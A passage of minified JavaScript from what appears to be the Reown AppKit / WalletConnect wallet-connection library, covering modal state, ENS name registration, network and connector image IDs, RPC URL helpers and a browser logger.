0,xn.balanceLoading=!1,a}}catch(a){xn.lastRetry=Date.now(),t==null||t(a),ut.showError("Token Balance Unavailable")}finally{xn.balanceLoading=!1}return[]},resetAccount(t){B.resetAccount(t)}},Dr=ht({loading:!1,loadingNamespaceMap:new Map,open:!1,shake:!1,namespace:void 0}),qe={state:Dr,subscribe(t){return yr(Dr,()=>t(Dr))},subscribeKey(t,e){return Tr(Dr,t,e)},async open(t){var n;const e=me.state.status==="connected";we.state.wcBasic?oe.prefetch({fetchNetworkImages:!1,fetchConnectorImages:!1}):await oe.prefetch({fetchConnectorImages:!e,fetchFeaturedWallets:!e,fetchRecommendedWallets:!e}),t!=null&&t.namespace?(await B.switchActiveNamespace(t.namespace),qe.setLoading(!0,t.namespace)):qe.setLoading(!0),ae.setFilterByNamespace(t==null?void 0:t.namespace);const r=(n=B.getAccountData(t==null?void 0:t.namespace))==null?void 0:n.caipAddress;B.state.noAdapters&&!r?te.isMobile()?se.reset("AllWallets"):se.reset("ConnectingWalletConnectBasic"):t!=null&&t.view?se.reset(t.view,t.data):r?se.reset("Account"):se.reset("Connect"),Dr.open=!0,Us.set({open:!0}),De.sendEvent({type:"track",event:"MODAL_OPEN",properties:{connected:!!r}})},close(){const t=Y.state.enableEmbedded,e=!!B.state.activeCaipAddress;Dr.open&&De.sendEvent({type:"track",event:"MODAL_CLOSE",properties:{connected:e}}),Dr.open=!1,qe.clearLoading(),t?e?se.replace("Account"):se.push("Connect"):Us.set({open:!1}),we.resetUri()},setLoading(t,e){e&&Dr.loadingNamespaceMap.set(e,t),Dr.loading=t,Us.set({loading:t})},clearLoading(){Dr.loadingNamespaceMap.clear(),Dr.loading=!1},shake(){Dr.shake||(Dr.shake=!0,setTimeout(()=>{Dr.shake=!1},500))}},R4={id:"2b92315d-eab7-5bef-84fa-089a131333f5",name:"USD Coin",symbol:"USDC",networks:[{name:"ethereum-mainnet",display_name:"Ethereum",chain_id:"1",contract_address:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"},{name:"polygon-mainnet",display_name:"Polygon",chain_id:"137",contract_address:"0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"}]},FV={id:"USD",payment_method_limits:[{id:"card",min:"10.00",max:"7500.00"},{id:"ach_bank_account",min:"10.00",max:"25000.00"}]},zV={providers:bj,selectedProvider:null,error:null,purchaseCurrency:R4,paymentCurrency:FV,purchaseCurrencies:[R4],paymentCurrencies:[],quotesLoading:!1};ht(zV);const jV={initializing:!1,initialized:!1,loadingPrices:!1,loadingQuote:!1,loadingApprovalTransaction:!1,loadingBuildTransaction:!1,loadingTransaction:!1,fetchError:!1,approvalTransaction:void 0,swapTransaction:void 0,transactionError:void 0,sourceToken:void 0,sourceTokenAmount:"",sourceTokenPriceInUSD:0,toToken:void 0,toTokenAmount:"",toTokenPriceInUSD:0,networkPrice:"0",networkBalanceInUSD:"0",networkTokenSymbol:"",inputError:void 0,slippage:Ut.CONVERT_SLIPPAGE_TOLERANCE,tokens:void 0,popularTokens:void 0,suggestedTokens:void 0,foundTokens:void 0,myTokensWithBalance:void 0,tokensPriceMap:{},gasFee:"0",gasPriceInUSD:0,priceImpact:void 0,maxSlippage:void 0,providerFee:void 0};ht(jV);const Kn=ht({message:"",open:!1,triggerRect:{width:0,height:0,top:0,left:0},variant:"shade"}),Al={state:Kn,subscribe(t){return yr(Kn,()=>t(Kn))},subscribeKey(t,e){return Tr(Kn,t,e)},showTooltip({message:t,triggerRect:e,variant:r}){Kn.open=!0,Kn.message=t,Kn.triggerRect=e,Kn.variant=r},hide(){Kn.open=!1,Kn.message="",Kn.triggerRect={width:0,height:0,top:0,left:0}}},D4=2147483648,HV={convertEVMChainIdToCoinType(t){if(t>=D4)throw new Error("Invalid chainId");return(D4|t)>>>0}},In=ht({suggestions:[],loading:!1}),w9={state:In,subscribe(t){return yr(In,()=>t(In))},subscribeKey(t,e){return Tr(In,t,e)},async resolveName(t){var e,r;try{return await Ie.lookupEnsName(t)}catch(n){const i=n;throw new Error(((r=(e=i==null?void 0:i.reasons)==null?void 0:e[0])==null?void 0:r.description)||"Error resolving name")}},async isNameRegistered(t){try{return await Ie.lookupEnsName(t),!0}catch{return!1}},async getSuggestions(t){try{In.loading=!0,In.suggestions=[];const e=await Ie.getEnsNameSuggestions(t);return In.suggestions=e.suggestions.map(r=>({...r,name:r.name}))||[],In.suggestions}catch(e){const r=this.parseEnsApiError(e,"Error fetching name suggestions");throw new Error(r)}finally{In.loading=!1}},async getNamesForAddress(t){try{if(!B.state.activeCaipNetwork)return[];const e=pe.getEnsFromCacheForAddress(t);if(e)return e;const r=await Ie.reverseLookupEnsName({address:t});return pe.updateEnsCache({address:t,ens:r,timestamp:Date.now()}),r}catch(e){const r=this.parseEnsApiError(e,"Error fetching names for address");throw new Error(r)}},async registerName(t){const e=B.state.activeCaipNetwork;if(!e)throw new Error("Network not found");const r=me.state.address,n=ae.getAuthConnector();if(!r||!n)throw new Error("Address or auth connector not found");In.loading=!0;try{const i=JSON.stringify({name:t,attributes:{},timestamp:Math.floor(Date.now()/1e3)});se.pushTransactionStack({view:"RegisterAccountNameSuccess",goBack:!1,replace:!0,onCancel(){In.loading=!1}});const s=await we.signMessage(i),o=e.id;if(!o)throw new Error("Network not found");const a=HV.convertEVMChainIdToCoinType(Number(o));await Ie.registerEnsName({coinType:a,address:r,signature:s,message:i}),me.setProfileName(t,e.chainNamespace),se.replace("RegisterAccountNameSuccess")}catch(i){const s=this.parseEnsApiError(i,`Error registering name ${t}`);throw se.replace("RegisterAccountName"),new Error(s)}finally{In.loading=!1}},validateName(t){return/^[a-zA-Z0-9-]{4,}$/u.test(t)},parseEnsApiError(t,e){var r,n;return((n=(r=t==null?void 0:t.reasons)==null?void 0:r[0])==null?void 0:n.description)||e}};ht({isLegalCheckboxChecked:!1});const oo={EIP155:"eip155",CONNECTOR_TYPE_WALLET_CONNECT:"WALLET_CONNECT",CONNECTOR_TYPE_INJECTED:"INJECTED",CONNECTOR_TYPE_ANNOUNCED:"ANNOUNCED"},lg={NetworkImageIds:{1:"ba0ba0cd-17c6-4806-ad93-f9d174f17900",42161:"3bff954d-5cb0-47a0-9a23-d20192e74600",43114:"30c46e53-e989-45fb-4549-be3bd4eb3b00",56:"93564157-2e8e-4ce7-81df-b264dbee9b00",250:"06b26297-fe0c-4733-5d6b-ffa5498aac00",10:"ab9c186a-c52f-464b-2906-ca59d760a400",137:"41d04d42-da3b-4453-8506-668cc0727900",5e3:"e86fae9b-b770-4eea-e520-150e12c81100",295:"6a97d510-cac8-4e58-c7ce-e8681b044c00",11155111:"e909ea0a-f92a-4512-c8fc-748044ea6800",84532:"a18a7ecd-e307-4360-4746-283182228e00",1301:"4eeea7ef-0014-4649-5d1d-07271a80f600",130:"2257980a-3463-48c6-cbac-a42d2a956e00",10143:"0a728e83-bacb-46db-7844-948f05434900",100:"02b53f6a-e3d4-479e-1cb4-21178987d100",9001:"f926ff41-260d-4028-635e-91913fc28e00",324:"b310f07f-4ef7-49f3-7073-2a0a39685800",314:"5a73b3dd-af74-424e-cae0-0de859ee9400",4689:"34e68754-e536-40da-c153-6ef2e7188a00",1088:"3897a66d-40b9-4833-162f-a2c90531c900",1284:"161038da-44ae-4ec7-1208-0ea569454b00",1285:"f1d73bb6-5450-4e18-38f7-fb6484264a00",7777777:"845c60df-d429-4991-e687-91ae45791600",42220:"ab781bbc-ccc6-418d-d32d-789b15da1f00",8453:"7289c336-3981-4081-c5f4-efc26ac64a00",1313161554:"3ff73439-a619-4894-9262-4470c773a100",2020:"b8101fc0-9c19-4b6f-ec65-f6dfff106e00",2021:"b8101fc0-9c19-4b6f-ec65-f6dfff106e00",80094:"e329c2c9-59b0-4a02-83e4-212ff3779900",2741:"fc2427d1-5af9-4a9c-8da5-6f94627cd900","5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp":"a1b58899-f671-4276-6a5e-56ca5bd59700","4uhcVJyU9pJkvQyS88uRDiswHXSCkY3z":"a1b58899-f671-4276-6a5e-56ca5bd59700",EtWTRABZaYq6iMfeYKouRu166VU2xqa1:"a1b58899-f671-4276-6a5e-56ca5bd59700","000000000019d6689c085ae165831e93":"0b4838db-0161-4ffe-022d-532bf03dba00","000000000933ea01ad0ee984209779ba":"39354064-d79b-420b-065d-f980c4b78200"},ConnectorImageIds:{[ve.CONNECTOR_ID.COINBASE]:"0c2840c3-5b04-4c44-9661-fbd4b49e1800",[ve.CONNECTOR_ID.COINBASE_SDK]:"0c2840c3-5b04-4c44-9661-fbd4b49e1800",[ve.CONNECTOR_ID.SAFE]:"461db637-8616-43ce-035a-d89b8a1d5800",[ve.CONNECTOR_ID.LEDGER]:"54a1aa77-d202-4f8d-0fb2-5d2bb6db0300",[ve.CONNECTOR_ID.WALLET_CONNECT]:"ef1a1fcf-7fe8-4d69-bd6d-fda1345b4400",[ve.CONNECTOR_ID.INJECTED]:"07ba87ed-43aa-4adf-4540-9e6a2b9cae00"},ConnectorNamesMap:{[ve.CONNECTOR_ID.INJECTED]:"Browser Wallet",[ve.CONNECTOR_ID.WALLET_CONNECT]:"WalletConnect",[ve.CONNECTOR_ID.COINBASE]:"Coinbase",[ve.CONNECTOR_ID.COINBASE_SDK]:"Coinbase",[ve.CONNECTOR_ID.LEDGER]:"Ledger",[ve.CONNECTOR_ID.SAFE]:"Safe"}},w2={getCaipTokens(t){if(!t)return;const e={};return Object.entries(t).forEach(([r,n])=>{e[`${oo.EIP155}:${r}`]=n}),e},isLowerCaseMatch(t,e){return(t==null?void 0:t.toLowerCase())===(e==null?void 0:e.toLowerCase())}},Mp={UniversalProviderErrors:{UNAUTHORIZED_DOMAIN_NOT_ALLOWED:{message:"Unauthorized: origin not allowed",alertErrorKey:"INVALID_APP_CONFIGURATION"},JWT_VALIDATION_ERROR:{message:"JWT validation error: JWT Token is not yet valid",alertErrorKey:"JWT_TOKEN_NOT_VALID"},INVALID_KEY:{message:"Unauthorized: invalid key",alertErrorKey:"INVALID_PROJECT_ID"}},ALERT_ERRORS:{SWITCH_NETWORK_NOT_FOUND:{shortMessage:"Network Not Found",longMessage:"Network not found - please make sure it is included in 'networks' array in createAppKit function"},INVALID_APP_CONFIGURATION:{shortMessage:"Invalid App Configuration",longMessage:()=>`Origin ${qV()?window.origin:"unknown"} not found on Allowlist - update configuration on cloud.reown.com`},SOCIALS_TIMEOUT:{shortMessage:"Invalid App Configuration",longMessage:()=>"There was an issue loading the embedded wallet. Please verify that your domain is allowed at cloud.reown.com"},JWT_TOKEN_NOT_VALID:{shortMessage:"Session Expired",longMessage:"Invalid session found on UniversalProvider - please check your time settings and connect again"},INVALID_PROJECT_ID:{shortMessage:"Invalid App Configuration",longMessage:"Invalid Project ID - update configuration"},PROJECT_ID_NOT_CONFIGURED:{shortMessage:"Project ID Not Configured",longMessage:"Project ID Not Configured - update configuration on cloud.reown.com"}}};function qV(){return typeof window<"u"}function VV(t){try{return JSON.stringify(t)}catch{return'"[Circular]"'}}var WV=GV;function GV(t,e,r){var n=r&&r.stringify||VV,i=1;if(typeof t=="object"&&t!==null){var s=e.length+i;if(s===1)return t;var o=new Array(s);o[0]=n(t);for(var a=1;a<s;a++)o[a]=n(e[a]);return o.join(" ")}if(typeof t!="string")return t;var c=e.length;if(c===0)return t;for(var l="",u=1-i,h=-1,d=t&&t.length||0,f=0;f<d;){if(t.charCodeAt(f)===37&&f+1<d){switch(h=h>-1?h:0,t.charCodeAt(f+1)){case 100:case 102:if(u>=c||e[u]==null)break;h<f&&(l+=t.slice(h,f)),l+=Number(e[u]),h=f+2,f++;break;case 105:if(u>=c||e[u]==null)break;h<f&&(l+=t.slice(h,f)),l+=Math.floor(Number(e[u])),h=f+2,f++;break;case 79:case 111:case 106:if(u>=c||e[u]===void 0)break;h<f&&(l+=t.slice(h,f));var g=typeof e[u];if(g==="string"){l+="'"+e[u]+"'",h=f+2,f++;break}if(g==="function"){l+=e[u].name||"<anonymous>",h=f+2,f++;break}l+=n(e[u]),h=f+2,f++;break;case 115:if(u>=c)break;h<f&&(l+=t.slice(h,f)),l+=String(e[u]),h=f+2,f++;break;case 37:h<f&&(l+=t.slice(h,f)),l+="%",h=f+2,f++,u--;break}++u}++f}return h===-1?t:(h<d&&(l+=t.slice(h)),l)}const B4=WV;var Na=Wi;const lf=nW().console||{},KV={mapHttpRequest:Fp,mapHttpResponse:Fp,wrapRequestSerializer:Mw,wrapResponseSerializer:Mw,wrapErrorSerializer:Mw,req:Fp,res:Fp,err:XV};function ZV(t,e){return Array.isArray(t)?t.filter(function(r){return r!=="!stdSerializers.err"}):t===!0?Object.keys(e):!1}function Wi(t){t=t||{},t.browser=t.browser||{};const e=t.browser.transmit;if(e&&typeof e.send!="function")throw Error("pino: transmit option must have a send function");const r=t.browser.write||lf;t.browser.write&&(t.browser.asObject=!0);const n=t.serializers||{},i=ZV(t.browser.serialize,n);let s=t.browser.serialize;Array.isArray(t.browser.serialize)&&t.browser.serialize.indexOf("!stdSerializers.err")>-1&&(s=!1);const o=["error","fatal","warn","info","debug","trace"];typeof r=="function"&&(r.error=r.fatal=r.warn=r.info=r.debug=r.trace=r),t.enabled===!1&&(t.level="silent");const a=t.level||"info",c=Object.create(r);c.log||(c.log=uf),Object.defineProperty(c,"levelVal",{get:u}),Object.defineProperty(c,"level",{get:h,set:d});const l={transmit:e,serialize:i,asObject:t.browser.asObject,levels:o,timestamp:eW(t)};c.levels=Wi.levels,c.level=a,c.setMaxListeners=c.getMaxListeners=c.emit=c.addListener=c.on=c.prependListener=c.once=c.prependOnceListener=c.removeListener=c.removeAllListeners=c.listeners=c.listenerCount=c.eventNames=c.write=c.flush=uf,c.serializers=n,c._serialize=i,c._stdErrSerialize=s,c.child=f,e&&(c._logEvent=Uy());function u(){return this.level==="silent"?1/0:this.levels.values[this.level]}function h(){return this._level}function d(g){if(g!=="silent"&&!this.levels.values[g])throw Error("unknown level "+g);this._level=g,ll(l,c,"error","log"),ll(l,c,"fatal","error"),ll(l,c,"warn","error"),ll(l,c,"info","log"),ll(l,c,"debug","log"),ll(l,c,"trace","log")}function f(g,p){if(!g)throw new Error("missing bindings for child Pino");p=p||{},i&&g.serializers&&(p.serializers=g.serializers);const w=p.serializers;if(i&&w){var m=Object.assign({},n,w),b=t.browser.serialize===!0?Object.keys(m):i;delete g.serializers,d1([g],b,m,this._stdErrSerialize)}function v(x){this._childLevel=(x._childLevel|0)+1,this.error=ul(x,g,"error"),this.fatal=ul(x,g,"fatal"),this.warn=ul(x,g,"warn"),this.info=ul(x,g,"info"),this.debug=ul(x,g,"debug"),this.trace=ul(x,g,"trace"),m&&(this.serializers=m,this._serialize=b),e&&(this._logEvent=Uy([].concat(x._logEvent.bindings,g)))}return v.prototype=this,new v(this)}return c}Wi.levels={values:{fatal:60,error:50,warn:40,info:30,debug:20,trace:10},labels:{10:"trace",20:"debug",30:"info",40:"warn",50:"error",60:"fatal"}},Wi.stdSerializers=KV,Wi.stdTimeFunctions=Object.assign({},{nullTime:m9,epochTime:y9,unixTime:tW,isoTime:rW});function ll(t,e,r,n){const i=Object.getPrototypeOf(e);e[r]=e.levelVal>e.levels.values[r]?uf:i[r]?i[r]:lf[r]||lf[n]||uf,JV(t,e,r)}function JV(t,e,r){!t.transmit&&e[r]===uf||(e[r]=function(n){return function(){const i=t.timestamp(),s=new Array(arguments.length),o=Object.getPrototypeOf&&Object.getPrototypeOf(this)===lf?lf:this;for(var a=0;a<s.length;a++)s[a]=arguments[a];if(t.serialize&&!t.asObject&&d1(s,this._serialize,this.serializers,this._stdErrSerialize),t.asObject?n.call(o,QV(this,r,s,i)):n.apply(o,s),t.transmit){const c=t.transmit.level||e.level,l=Wi.levels.values[c],u=Wi.levels.values[r];if(u<l)return;YV(this,{ts:i,methodLevel:r,methodValue:u,transmitValue:Wi.levels.values[t.transmit.level||e.level],send:t.transmit.send,val:e.levelVal},s)}}}(e[r]))}function QV(t,e,r,n){t._serialize&&d1(r,t._serialize,t.serializers,t._stdErrSerialize);const i=r.slice();let s=i[0];const o={};n&&(o.time=n),o.level=Wi.levels.values[e];let a=(t._childLevel|0)+1;if(a<1&&(a=1),s!==null&&typeof s=="object"){for(;a--&&typeof i[0]=="object";)Object.assign(o,i.shift());s=i.length?B4(i.shift(),i):void 0}else typeof s=="string"&&(s=B4(i.shift(),i));return s!==void 0&&(o.msg=s),o}function d1(t,e,r,n){for(const i in t)if(n&&t[i]instanceof Error)t[i]=Wi.stdSerializers.err(t[i]);else if(typeof t[i]=="object"&&!Array.isArray(t[i]))for(const s in t[i])e&&e.indexOf(s)>-1&&s in r&&(t[i][s]=r[s](t[i][s]))}function ul(t,e,r){return function(){const n=new Array(1+arguments.length);n[0]=e;for(var i=1;i<n.length;i++)n[i]=arguments[i-1];return t[r].apply(this,n)}}function YV(t,e,r){const n=e.send,i=e.ts,s=e.methodLevel,o=e.methodValue,a=e.val,c=t._logEvent.bindings;d1(r,t._serialize||Object.keys(t.serializers),t.serializers,t._stdErrSerialize===void 0?!0:t._stdErrSerialize),t._logEvent.ts=i,t._logEvent.messages=r.filter(function(l){return c.indexOf(l)===-1}),t._logEvent.level.label=s,t._logEvent.level.value=o,n(s,t._logEvent,a),t._logEvent=Uy(c)}function Uy(t){return{ts:0,messages:[],bindings:t||[],level:{label:"",value:0}}}function XV(t){const e={type:t.constructor.name,msg:t.message,stack:t.stack};for(const r in t)e[r]===void 0&&(e[r]=t[r]);return e}function eW(t){return typeof t.timestamp=="function"?t.timestamp:t.timestamp===!1?m9:y9}function Fp(){return{}}function Mw(t){return t}function uf(){}function m9(){return!1}function y9(){return Date.now()}function tW(){return Math.round(Date.now()/1e3)}function rW(){return new Date(Date.now()).toISOString()}function nW(){function t(e){return typeof e<"u"&&e}try{return typeof globalThis<"u"||Object.defineProperty(Object.prototype,"globalThis",{get:function(){return delete Object.prototype.globalThis,this.globalThis=this},configurable:!0}),globalThis}catch{return t(self)||t(window)||t(this)||{}}}const iW=t=>JSON.stringify(t,(e,r)=>typeof r=="bigint"?r.toString()+"n":r);function L4(t){return typeof t=="string"?t:iW(t)||""}const sW={level:"info"},m2=1e3*1024;class oW{constructor(e){this.nodeValue=e,this.sizeInBytes=new TextEncoder().encode(this.nodeValue).length,this.next=null}get value(){return this.nodeValue}get size(){return this.sizeInBytes}}class U4{constructor(e){this.head=null,this.tail=null,this.lengthInNodes=0,this.maxSizeInBytes=e,this.sizeInBytes=0}append(e){const r=new oW(e);if(r.size>this.maxSizeInBytes)throw new Error(`[LinkedList] Value too big to insert into list: ${e} with size ${r.size}`);for(;this.size+r.size>this.maxSizeInBytes;)this.shift();this.head?(this.tail&&(this.tail.next=r),this.tail=r):(this.head=r,this.tail=r),this.lengthInNodes++,this.sizeInBytes+=r.size}shift(){if(!this.head)return;const e=this.head;this.head=this.head.next,this.head||(this.tail=null),this.lengthInNodes--,this.sizeInBytes-=e.size}toArray(){const e=[];let r=this.head;for(;r!==null;)e.push(r.value),r=r.next;return e}get length(){return this.lengthInNodes}get size(){return this.sizeInBytes}toOrderedArray(){return Array.from(this)}[Symbol.iterator](){let e=this.head;return{next:()=>{if(!e)return{done:!0,value:null};const r=e.value;return e=e.next,{done:!1,value:r}}}}}class b9{constructor(e,r=m2){this.level=e??"error",this.levelValue=Na.levels.values[this.level],this.MAX_LOG_SIZE_IN_BYTES=r,this.logs=new U4(this.MAX_LOG_SIZE_IN_BYTES)}forwardToConsole(e,r){r===Na.levels.values.error?console.error(e):r===Na.levels.values.warn?console.warn(e):r===Na.levels.values.debug?console.debug(e):r===Na.levels.values.trace?console.trace(e):console.log(e)}appendToLogs(e){this.logs.append(L4({timestamp:new Date().toISOString(),log:e}));const r=typeof e=="string"?JSON.parse(e).level:e.level;r>=this.levelValue&&this.forwardToConsole(e,r)}getLogs(){return this.logs}clearLogs(){this.logs=new U4(this.MAX_LOG_SIZE_IN_BYTES)}getLogArray(){return Array.from(this.logs)}logsToBlob(e){const r=this.getLogArray();return r.push(L4({extraMetadata:e})),new Blob(r,{type:"application/json"})}}class aW{constructor(e,r=m2){this.baseChunkLogger=new b9(e,r)}write(e){this.baseChunkLogger.appendToLogs(e)}getLogs(){return this.baseChunkLogger.getLogs()}clearLogs(){this.baseChunkLogger.clearLogs()}getLogArray(){return this.baseChunkLogger.getLogArray()}logsToBlob(e){return this.baseChunkLogger.logsToBlob(e)}downloadLogsBlobInBrowser(e){const r=URL.createObjectURL(this.logsToBlob(e)),n=document.createElement("a");n.href=r,n.download=`walletconnect-logs-${new Date().toISOString()}.txt`,document.body.appendChild(n),n.click(),document.body.removeChild(n),URL.revokeObjectURL(r)}}class cW{constructor(e,r=m2){this.baseChunkLogger=new b9(e,r)}write(e){this.baseChunkLogger.appendToLogs(e)}getLogs(){return this.baseChunkLogger.getLogs()}clearLogs(){this.baseChunkLogger.clearLogs()}getLogArray(){return this.baseChunkLogger.getLogArray()}logsToBlob(e){return this.baseChunkLogger.logsToBlob(e)}}var lW=Object.defineProperty,uW=Object.defineProperties,hW=Object.getOwnPropertyDescriptors,M4=Object.getOwnPropertySymbols,dW=Object.prototype.hasOwnProperty,fW=Object.prototype.propertyIsEnumerable,F4=(t,e,r)=>e in t?lW(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,ug=(t,e)=>{for(var r in e||(e={}))dW.call(e,r)&&F4(t,r,e[r]);if(M4)for(var r of M4(e))fW.call(e,r)&&F4(t,r,e[r]);return t},hg=(t,e)=>uW(t,hW(e));function pW(t){return hg(ug({},t),{level:(t==null?void 0:t.level)||sW.level})}function gW(t){var e,r;const n=new aW((e=t.opts)==null?void 0:e.level,t.maxSizeInBytes);return{logger:Na(hg(ug({},t.opts),{level:"trace",browser:hg(ug({},(r=t.opts)==null?void 0:r.browser),{write:i=>n.write(i)})})),chunkLoggerController:n}}function wW(t){var e;const r=new cW((e=t.opts)==null?void 0:e.level,t.maxSizeInBytes);return{logger:Na(hg(ug({},t.opts),{level:"trace"})),chunkLoggerController:r}}function mW(t){return typeof t.loggerOverride<"u"&&typeof t.loggerOverride!="string"?{logger:t.loggerOverride,chunkLoggerController:null}:typeof window<"u"?gW(t):wW(t)}const yW={createLogger(t,e="error"){const r=pW({level:e}),{logger:n}=mW({opts:r});return n.error=(...i)=>{for(const s of i)if(s instanceof Error){t(s,...i);return}t(void 0,...i)},n}},bW="rpc.walletconnect.org";function z4(t,e){const r=new URL("https://rpc.walletconnect.org/v1/");return r.searchParams.set("chainId",t),r.searchParams.set("projectId",e),r.toString()}const Fw=["near:mainnet","solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp","eip155:1101","eip155:56","eip155:42161","eip155:7777777","eip155:59144","eip155:324","solana:EtWTRABZaYq6iMfeYKouRu166VU2xqa1","eip155:5000","solana:4sgjmw1sunhzsxgspuhpqldx6wiyjntz","eip155:80084","eip155:5003","eip155:100","eip155:8453","eip155:42220","eip155:1313161555","eip155:17000","eip155:1","eip155:300","eip155:1313161554","eip155:1329","eip155:84532","eip155:421614","eip155:11155111","eip155:8217","eip155:43114","solana:4uhcVJyU9pJkvQyS88uRDiswHXSCkY3z","eip155:999999999","eip155:11155420","eip155:80002","eip155:97","eip155:43113","eip155:137","eip155:10","eip155:1301","bip122:000000000019d6689c085ae165831e93","bip122:000000000933ea01ad0ee984209779ba"],xl={extendRpcUrlWithProjectId(t,e){let r=!1;try{r=new URL(t).host===bW}catch{r=!1}if(r){const n=new URL(t);return n.searchParams.has("projectId")||n.searchParams.set("projectId",e),n.toString()}return t},isCaipNetwork(t){return"chainNamespace"in t&&"caipNetworkId"in t},getChainNamespace(t){return this.isCaipNetwork(t)?t.chainNamespace:ve.CHAIN.EVM},getCaipNetworkId(t){return this.isCaipNetwork(t)?t.caipNetworkId:`${ve.CHAIN.EVM}:${t.id}`},getDefaultRpcUrl(t,e,r){var i,s,o;const n=(o=(s=(i=t.rpcUrls)==null?void 0:i.default)==null?void 0:s.http)==null?void 0:o[0];return Fw.includes(e)?z4(e,r):n||""},extendCaipNetwork(t,{customNetworkImageUrls:e,projectId:r,customRpcUrls:n}){var d,f,g,p,w;const i=this.getChainNamespace(t),s=this.getCaipNetworkId(t),o=(d=t.rpcUrls.default.http)==null?void 0:d[0],a=this.getDefaultRpcUrl(t,s,r),c=((p=(g=(f=t==null?void 0:t.rpcUrls)==null?void 0:f.chainDefault)==null?void 0:g.http)==null?void 0:p[0])||o,l=((w=n==null?void 0:n[s])==null?void 0:w.map(m=>m.url))||[],u=[...l,a],h=[...l];return c&&!h.includes(c)&&h.push(c),{...t,chainNamespace:i,caipNetworkId:s,assets:{imageId:lg.NetworkImageIds[t.id],imageUrl:e==null?void 0:e[t.id]},rpcUrls:{...t.rpcUrls,default:{http:u},chainDefault:{http:h}}}},extendCaipNetworks(t,{customNetworkImageUrls:e,projectId:r,customRpcUrls:n}){return t.map(i=>xl.extendCaipNetwork(i,{customNetworkImageUrls:e,customRpcUrls:n,projectId:r}))},getViemTransport(t,e,r){var i,s,o;const n=[];return r==null||r.forEach(a=>{n.push(Bp(a.url,a.config))}),Fw.includes(t.caipNetworkId)&&n.push(Bp(z4(t.caipNetworkId,e),{fetchOptions:{headers:{"Content-Type":"text/plain"}}})),(o=(s=(i=t==null?void 0:t.rpcUrls)==null?void 0:i.default)==null?void 0:s.http)==null||o.forEach(a=>{n.push(Bp(a))}),y4(n)},extendWagmiTransports(t,e,r){if(Fw.includes(t.caipNetworkId)){const n=this.getDefaultRpcUrl(t,t.caipNetworkId,e);return y4([r,Bp(n)])}return r},getUnsupportedNetwork(t){return{id:t.split(":")[1],caipNetworkId:t,name:ve.UNSUPPORTED_NETWORK_NAME,chainNamespace:t.split(":")[0],nativeCurrency:{name:"",decimals:0,symbol:""},rpcUrls:{default:{http:[]}}}},getCaipNetworkFromStorage(t){var a;const e=pe.getActiveCaipNetworkId(),r=B.getAllRequestedCaipNetworks(),n=Array.from(((a=B.state.chains)==null?void 0:a.keys())||[]),i=e==null?void 0:e.split(":")[0],s=i?n.includes(i):!1,o=r==null?void 0:r.find(c=>c.caipNetworkId===e);return s&&!o&&e?this.getUnsupportedNetwork(e):o||t||(r==null?void 0:r[0])}},dg={eip155:void 0,solana:void 0,polkadot:void 0,bip122:void 0},Br=ht({providers:{...dg},providerIds:{...dg}}),bt={state:Br,subscribeKey(t,e){return Tr(Br,t,e)},subscribe(t){return yr(Br,()=>{t(Br)})},subscribeProviders(t){return yr(Br.providers,()=>t(Br.providers))},setProvider(t,e){e&&(Br.providers[t]=Cc(e))},getProvider(t){return Br.providers[t]},setProviderId(t,e){e&&(Br.providerIds[t]=e)},getProviderId(t){if(t)return Br.providerIds[t]},reset(){Br.providers={...dg},Br.providerIds={...dg}},resetChain(t){Br.providers[t]=void 0,Br.providerIds[t]=void 0}};var j4;(function(t){t.Google="google",t.Github="github",t.Apple="apple",t.Facebook="facebook",t.X="x",t.Discord="discord",t.Farcaster="farcaster"})(j4||(j4={}));const Do={VIEW_DIRECTION:{Next:"next",Prev:"prev"},DEFAULT_CONNECT_METHOD_ORDER:["email","social","wallet"],ANIMATION_DURATIONS:{HeaderText:120,ModalHeight:150,ViewTransition:150}},Nc={filterOutDuplicatesByRDNS(t){const e=Y.state.enableEIP6963?ae.state.connectors:[],r=pe.getRecentWallets(),n=e.map(o=>{var a;return(a=o.info)==null?void 0:a.rdns}).filter(Boolean),i=r.map(o=>o.rdns).filter(Boolean),s=n.concat(i);if(s.includes("io.metamask.mobile")&&te.isMobile()){const o=s.indexOf("io.metamask.mobile");s[o]="io.metamask"}return t.filter(o=>!s.includes(String(o==null?void 0:o.rdns)))},filterOutDuplicatesByIds(t){const e=ae.state.connectors.filter(o=>o.type==="ANNOUNCED"||o.type==="INJECTED"),r=pe.getRecentWallets(),n=e.map(o=>o.explorerId),i=r.map(o=>o.id),s=n.concat(i);return t.filter(o=>!s.includes(o==null?void 0:o.id))},filterOutDuplicateWallets(t){const e=this.filterOutDuplicatesByRDNS(t);return this.filterOutDuplicatesByIds(e)},markWalletsAsInstalled(t){const{connectors:e}=ae.state,r=e.filter(n=>n.type==="ANNOUNCED").reduce((n,i)=>{var s;return(s=i.info)!=null&&s.rdns&&(n[i.info.rdns]=!0),n},{});return t.map(n=>({...n,installed:!!n.rdns&&!!r[n.rdns??""]})).sort((n,i)=>Number(i.installed)-Number(n.installed))},getConnectOrderMethod(t,e){var c;const r=(t==null?void 0:t.connectMethodsOrder)||((c=Y.state.features)==null?void 0:c.connectMethodsOrder),n=e||ae.state.connectors;if(r)return r;const{injected:i,announced:s}=Ms.getConnectorsByType(n,oe.state.recommended,oe.state.featured),o=i.filter(Ms.showConnector),a=s.filter(Ms.showConnector);return o.length||a.length?["wallet","email","social"]:Do.DEFAULT_CONNECT_METHOD_ORDER},isExcluded(t){const e=!!t.rdns&&oe.state.excludedWallets.some(n=>n.rdns===t.rdns),r=!!t.name&&oe.state.excludedWallets.some(n=>w2.isLowerCaseMatch(n.name,t.name));return e||r}},Ms={getConnectorsByType(t,e,r){const{customWallets:n}=Y.state,i=pe.getRecentWallets(),s=Nc.filterOutDuplicateWallets(e),o=Nc.filterOutDuplicateWallets(r),a=t.filter(h=>h.type==="MULTI_CHAIN"),c=t.filter(h=>h.type==="ANNOUNCED"),l=t.filter(h=>h.type==="INJECTED"),u=t.filter(h=>h.type==="EXTERNAL");return{custom:n,recent:i,external:u,multiChain:a,announced:c,injected:l,recommended:s,featured:o}},showConnector(t){var i;const e=(i=t.info)==null?void 